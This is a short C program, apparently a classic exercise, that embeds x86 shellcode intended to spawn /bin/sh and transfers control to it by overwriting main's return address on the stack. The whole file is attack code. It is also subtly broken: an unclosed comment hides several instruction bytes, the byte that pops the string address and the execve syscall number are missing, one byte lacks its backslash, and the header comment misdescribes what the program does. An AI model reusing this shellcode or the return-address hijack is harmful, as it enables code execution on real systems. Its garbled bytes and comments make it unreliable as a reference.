
/* shellcode.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    		             /* jump:              */
    "\xeb\x1f"             /* jum call              */  	
		           //popl:
    "\x89\x76\x08"          /* movl   %esi,0x8(%esi)*/   
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x88\x46\x07"          /* movb   %eax,0x7(%esi)*/
    "\x89\x46\x0c"          /* movl   %eax,0xc(%esi)*/
    "\x89\xf3"             /* movl    %esi,%ebx */
    "\x8d\x4e\x08"          /* leal 0x8(%esi),%ecx*/		
    "\x8d\x56\x0c"          /* leal 0xc(%esi),%edx*/	
    "\xcd\x80"             /* int     $0x80
    "\x31\xdb"             /* xor    %ebx,%ebx       
    "\x31\xc0"             /* xor    %eax,%eax                      */
    "\x40"                 /* inc %eax*/
				//call
    "\xe8\xdc\xff\xff\xff" //call popl
    "x2f\x62\x69\x6e\x2f\x73\x68"; //.string \"bin/sh\"

void main()                   //int argc, char **argv
{
    int *ret;
	ret=(int *)&ret+2;
	(*ret)=(int)shellcode;
}
